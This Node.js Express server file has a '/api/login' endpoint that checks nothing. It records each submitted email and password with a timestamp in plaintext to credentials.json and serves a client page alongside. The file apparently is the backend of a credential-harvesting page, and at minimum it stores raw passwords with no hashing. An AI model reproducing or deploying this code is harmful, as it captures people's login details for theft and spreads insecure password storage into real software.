const express = require('express');
const fs = require('fs').promises;
const cors = require('cors');
const path = require('path');

const app = express();
const port = 3000;

const corsOptions = {
  origin: 'http://127.0.0.1:5501',
  methods: 'GET,HEAD,PUT,PATCH,POST,DELETE',
  preflightContinue: false,
  optionsSuccessStatus: 204
};

app.use(express.json());
app.use(cors(corsOptions));
app.use(express.static(path.join(__dirname, '../client')));

let credentials = [];

async function loadCredentials() {
  try {
    const data = await fs.readFile('credentials.json', 'utf8');
    credentials = JSON.parse(data);
  } catch (err) {
    console.log('No existing credentials file found, starting fresh');
  }
}

async function saveCredentials() {
  try {
    await fs.writeFile('credentials.json', JSON.stringify(credentials, null, 2));
  } catch (err) {
    console.error('Error saving credentials:', err);
    throw err;
  }
}

app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) {
    return res.status(400).json({ error: 'Email and password are required' });
  }

  const credential = { email, password, timestamp: new Date().toISOString() };
  credentials.push(credential);

  try {
    await saveCredentials();
    res.json({ message: 'Login credentials saved successfully' });
  } catch (err) {
    res.status(500).json({ error: 'Server error' });
  }
});

async function startServer() {
  await loadCredentials();
  app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
  });
}

startServer().catch(console.error);